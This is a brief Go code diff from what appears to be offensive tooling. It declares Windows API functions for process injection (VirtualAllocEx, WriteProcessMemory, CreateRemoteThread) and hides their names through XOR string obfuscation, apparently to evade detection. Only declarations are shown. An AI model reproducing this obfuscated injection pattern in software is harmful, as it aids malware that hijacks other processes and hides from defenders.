@@ -65,12 +65,10 @@ var (
 	procGlobalUnlock             = k32.NewProc("GlobalUnlock")
 	procGlobalAlloc              = k32.NewProc("GlobalAlloc")
 	procGlobalSize               = k32.NewProc("GlobalSize")
-	procGlobalFree               = k32.NewProc("GlobalFree")
 )
 
 // Process injection proc declarations (obfuscated via strxor)
 var (
-	procOpenProcessEx      = k32.NewProc(s(SProcOpenP))
 	procVirtualAllocEx     = k32.NewProc(s(SProcVAllocEx))
 	procWriteProcessMemory = k32.NewProc(s(SProcWPMem))
 	procCreateRemoteThread = k32.NewProc(s(SProcCRThread))
